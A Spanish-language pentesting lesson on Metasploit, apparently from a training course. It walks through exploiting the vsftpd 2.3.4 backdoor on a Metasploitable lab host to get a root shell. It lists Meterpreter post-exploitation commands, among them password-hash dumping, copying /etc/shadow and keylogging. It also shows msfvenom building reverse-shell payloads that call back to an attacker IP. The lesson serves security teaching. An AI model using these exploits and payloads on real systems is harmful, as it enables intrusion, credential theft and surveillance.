Fase 2 — Pentesting Fundamental

Metasploit — Framework de explotación de vulnerabilidades

Metasploit es el framework de explotación más poderoso y más usado del mundo. Contiene miles de exploits, payloads y módulos auxiliares listos para usar. En esta lección aprenderás a buscar y usar exploits, generar payloads, usar Meterpreter y hacer post-explotación y escalada de privilegios.

1. ¿Qué es Metasploit?

Metasploit es un framework open source desarrollado por Rapid7 que permite buscar vulnerabilidades, desarrollar exploits, y ejecutar ataques de forma organizada. Viene pre-instalado en Kali Linux.

2. Arquitectura: exploits, payloads y módulos

3. msfconsole: la consola principal

Comandos básicos de msfconsole
$ msfconsole -q    # Iniciar sin banner (-q = quiet)

msf6 > search vsftpd              # Buscar exploits
msf6 > search type:exploit smb     # Buscar exploits de SMB
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor  # Seleccionar
msf6 > info                        # Ver información del módulo
msf6 > show options                # Ver opciones a configurar
msf6 > set RHOSTS 10.0.2.15        # Configurar el objetivo
msf6 > set LHOST 10.0.2.5          # Tu IP (para reverse shell)
msf6 > show payloads               # Ver payloads compatibles
msf6 > set PAYLOAD cmd/unix/interact
msf6 > exploit                     # ¡Lanzar el ataque!
msf6 > back                        # Salir del módulo actual
msf6 > sessions                    # Ver sesiones activas
msf6 > sessions -i 1               # Interactuar con sesión 1

4. Tu primer exploit: vsftpd backdoor

vsftpd 2.3.4 tiene un backdoor famoso: si te conectas con un username que termina en :), abre una shell de root en el puerto 6200. Metasploitable tiene esta versión.

Explotar vsftpd 2.3.4 paso a paso
msf6 > search vsftpd
   0  exploit/unix/ftp/vsftpd_234_backdoor  excellent

msf6 > use 0
msf6 exploit(vsftpd_234_backdoor) > show options

   Name    Setting   Required  Description
   ----    -------   --------  -----------
   RHOSTS              yes     Target address
   RPORT   21          yes     Target port

msf6 > set RHOSTS 10.0.2.15
msf6 > exploit

[*] 10.0.2.15:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.0.2.15:21 - USER: 331 Please specify the password.
[+] 10.0.2.15:21 - Backdoor service has been spawned
[+] 10.0.2.15:21 - UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened

root@metasploitable:/# whoami
root
root@metasploitable:/# id
uid=0(root) gid=0(root)

# ¡ERES ROOT! Tienes control total del sistema.

¡Acabas de hackear tu primera máquina! El proceso fue: descubrir el servicio con Nmap (vsftpd 2.3.4) → buscar un exploit en Metasploit → configurarlo → ejecutarlo → obtener shell de root.

5. Meterpreter: el payload más poderoso

Meterpreter es un payload avanzado que se ejecuta en memoria (difícil de detectar) y ofrece un arsenal de comandos para post-explotación:

Comandos de Meterpreter
meterpreter > sysinfo           # Info del sistema
meterpreter > getuid            # Tu usuario actual
meterpreter > hashdump          # Extraer hashes de contraseñas
meterpreter > shell             # Abrir shell del sistema
meterpreter > upload /tmp/linpeas.sh /tmp/  # Subir archivos
meterpreter > download /etc/shadow /tmp/    # Descargar archivos
meterpreter > ps                # Listar procesos
meterpreter > migrate 1234      # Migrar a otro proceso (persistencia)
meterpreter > keyscan_start     # Iniciar keylogger
meterpreter > keyscan_dump      # Ver teclas capturadas
meterpreter > screenshot        # Captura de pantalla
meterpreter > portfwd add -l 3389 -p 3389 -r 10.0.2.20  # Port forwarding
meterpreter > background        # Enviar sesión a segundo plano

6. Post-explotación

Una vez dentro de un sistema, la post-explotación incluye:

  • Recopilar información: usuarios, hashes, configuración, archivos sensibles.
  • Escalar privilegios: pasar de usuario normal a root/administrador.
  • Movimiento lateral: saltar a otras máquinas en la red.
  • Persistencia: mantener el acceso aunque la víctima reinicie.
  • Exfiltración: extraer datos sensibles para el reporte.

7. msfvenom: generar payloads personalizados

Generar payloads con msfvenom
# Reverse shell para Linux (ELF)
$ msfvenom -p linux/x86/meterpreter/reverse_tcp \
    LHOST=10.0.2.5 LPORT=4444 -f elf -o shell.elf

# Reverse shell para Windows (EXE)
$ msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=10.0.2.5 LPORT=4444 -f exe -o shell.exe

# Payload en Python
$ msfvenom -p python/meterpreter/reverse_tcp \
    LHOST=10.0.2.5 LPORT=4444 -o shell.py

# Después, configura el handler en Metasploit:
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 > set LHOST 10.0.2.5
msf6 > set LPORT 4444
msf6 > exploit
# Espera a que la víctima ejecute el payload...
